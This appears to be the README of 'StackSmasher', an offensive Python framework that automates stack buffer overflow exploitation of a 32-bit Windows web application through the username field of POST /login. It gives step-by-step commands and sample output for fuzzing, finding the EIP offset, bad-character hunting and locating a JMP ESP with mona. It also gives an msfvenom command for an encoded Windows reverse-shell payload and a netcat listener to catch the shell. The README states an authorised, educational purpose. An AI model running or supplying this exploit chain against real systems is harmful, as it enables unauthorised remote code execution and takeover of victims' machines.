# 🛡️ StackSmasher - Buffer Overflow Exploit Framework

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows" alt="Windows">
  <img src="https://img.shields.io/badge/Purpose-Educational-green?style=for-the-badge" alt="Educational">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="MIT">
</p>

An interactive **HTTP-based Buffer Overflow exploit framework** designed for penetration testing and security research. This tool automates the full buffer overflow exploitation workflow — from fuzzing to shell execution — targeting vulnerable web applications via `POST` requests.

---

## ⚠️ Disclaimer

> [!WARNING]
> **This tool is intended for authorized security testing and educational purposes ONLY.**
> Unauthorized use of this tool against systems you do not own or have explicit permission to test is **illegal** and **unethical**. The author is not responsible for any misuse or damage caused by this tool.

---

## 🎯 Features

| # | Feature | Description |
|---|---------|-------------|
| 1 | **Fuzzing** | Incrementally sends payloads (100–10,000 bytes) to detect crash points |
| 2 | **EIP Offset Finder** | Generates cyclic patterns to pinpoint the exact EIP offset |
| 3 | **Connection Tester** | Verifies target server availability before exploitation |
| 4 | **Bad Character Finder** | Sends all bytes (0x01–0xFF) to identify bad characters |
| 5 | **Full Exploit** | Delivers the final payload with shellcode for reverse shell |

---

## 📋 Requirements

- **Python** 3.x
- **Immunity Debugger** (on the target/victim machine)
- **mona.py** plugin for Immunity Debugger
- **msfvenom** (from Metasploit Framework) for shellcode generation

### Python Dependencies

```bash
pip install -r requirements.txt
```

Key libraries:
- `pwntools` — Pattern generation & EIP offset calculation
- `pyfiglet` — ASCII art banner

---

## 🚀 Installation

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/buffer_overflow.git
cd buffer_overflow

# Create virtual environment (recommended)
python -m venv .venv

# Activate virtual environment
# Windows:
.venv\Scripts\activate
# Linux:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

---

## 📖 Usage

Run the main script using Python:

```bash
python stacksmasher.py
```

You will see the interactive menu:

```text
-------------------------------------------------------
  ____  _             _     ____                      
 / ___|| |_ __ _  ___| | __/ ___| _ __ ___   __ _ ___ 
 \___ \| __/ _` |/ __| |/ /\___ \| '_ ` _ \ / _` / __|
  ___) | || (_| | (__|   <  ___) | | | | | | (_| \__ \
 |____/ \__\__,_|\___|_|\_\|____/|_| |_| |_|\__,_|___/
                                                      
  Stack Buffer Overflow Automation Tool v1.0
  Author: X7Null404 | GitHub: github.com/X7Null404
-------------------------------------------------------
[1] Fuzzing
[2] Find EIP Offset (Pattern)
[3] Test Connection
[4] Bad Characters
[5] Full Exploit
[0] Exit
```

---

## 🔄 Exploitation Workflow

Follow these steps **in order** for a successful exploit:

### Step 1: Fuzzing (Option 1)

Finds the approximate crash point by sending increasing payloads.

```text
[+] Enter target IPv4: 192.168.223.135
[+] Enter target Port: 80
[+] Fuzzing payload: Trying byte 100
[+] Fuzzing payload: Trying byte 200
...
[+] Crash detected - no response
[!] Crash detected at: 800
[+] Payload size 800 saved to number_to_pattern.txt
```

> [!NOTE]
> The crash size is automatically saved to `number_to_pattern.txt` for use in the next steps.

---

### Step 2: Find EIP Offset (Option 2)

Sends a cyclic pattern to determine the exact EIP offset.

```text
[+] Enter target IPv4: 192.168.223.135
[+] Enter target Port: 80
[+] Request Successful
[+] TimeOut - Server Likely crashed

[+] Now check Immunity Debugger for EIP value
[+] Look for: EIP: 0x42424242 (BBBB) or similar
[+] Insert EIP value (Example 544F4241): 39684138
[+] The EIP offset is 780 bytes
[+] EIP offset saved to eip_offset.txt
```

> [!IMPORTANT]
> - **In Immunity Debugger:** Check the EIP register value after the crash.
> - The offset is automatically saved to `eip_offset.txt`.

---

### Step 3: Test Connection (Option 3)

Verifies the target server is alive and responding.

```text
[+] Enter target IPv4: 192.168.223.135
[+] Enter target Port: 80
[+] Server responded
```

---

### Step 4: Find Bad Characters (Option 4)

Sends all bytes (`0x01`–`0xFF`) to identify characters that break the exploit structure.

```text
[+] Enter target IPv4: 192.168.223.135
[+] Enter target Port: 80
[+] Bad Characters payload sent
[+] Check memory dump in debugger!
Enter bad char found (comma separated, 00,0a,0d) :00
[+] No bad characters found - only null byte (0x00) excluded
```

> [!IMPORTANT]
> - **In Immunity Debugger:** Follow the `ESP` register in dump and compare it with the expected byte sequence to spot any missing or modified bytes.
> - Any bad characters found (such as `0a`, `0d`) should be entered when prompted.

---

### Step 5: Full Exploit (Option 5)

Delivers the final payload with your shellcode.

**Before running this step:**

1. **Find `JMP ESP` address** using Immunity Debugger:
   ```text
   !mona jmp -r esp -cpb "\x00"
   ```
   *Choose an address from a module with all protections (ASLR, Rebase, SafeSEH) disabled (e.g., `0x10090c83` from `libspp.dll`).*

2. **Generate shellcode** using `msfvenom` (exclude the bad characters found, e.g., `\x00`):
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -b '\x00' -e x86/shikata_ga_nai exitfunc=thread -o shellcode.bin
   ```

3. **Start a listener** on your machine:
   ```bash
   nc -lvnp 4444
   ```

4. **Run the exploit (Option 5):**
   ```text
   [+] Enter JMP ESP use command !mona jmp -r esp in immunity debugger! : 10090c83
   [+] Using EIP offset: 780
   [+] Exploit sent!
   [+] check your listener for shell...
   ```

---

## 🎯 Target Details

This exploit targets a vulnerable web application with:
- **Endpoint:** `POST /login`
- **Vulnerable Parameter:** `username` (login form field)
- **Protocol:** HTTP
- **Architecture:** x86 (32-bit Windows)

---

## 📁 Project Structure

```text
buffer_overflow/
├── stacksmasher.py          # Main exploit script (StackSmasher)
├── requirements.txt         # Python dependencies
├── README.md                # This file
├── shellcode.bin            # Generated shellcode (user-created)
├── number_to_pattern.txt    # Auto-generated: crash size from fuzzing
├── eip_offset.txt           # Auto-generated: EIP offset value
└── bad_char.txt             # Auto-generated: bad characters list
```

---

## 🛠️ Tools Used Alongside

| Tool | Purpose |
|------|---------|
| **Immunity Debugger** | Debugging & crash analysis on target |
| **mona.py** | Finding JMP ESP addresses & modules |
| **msfvenom** | Shellcode generation |
| **Netcat (nc)** | Reverse shell listener |

---

## 📝 Notes

- The tool uses **raw HTTP sockets** instead of the `requests` library for precise control over the payload delivery.
- **0x00 (null byte)** is always considered a bad character and is excluded by default.
- The NOP sled (`\x90 * 32`) provides a landing zone for the shellcode to ensure reliable execution.
- All generated data files (`number_to_pattern.txt`, `eip_offset.txt`, `bad_char.txt`) are created automatically during the workflow.

---

## 📜 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**X7Null404**
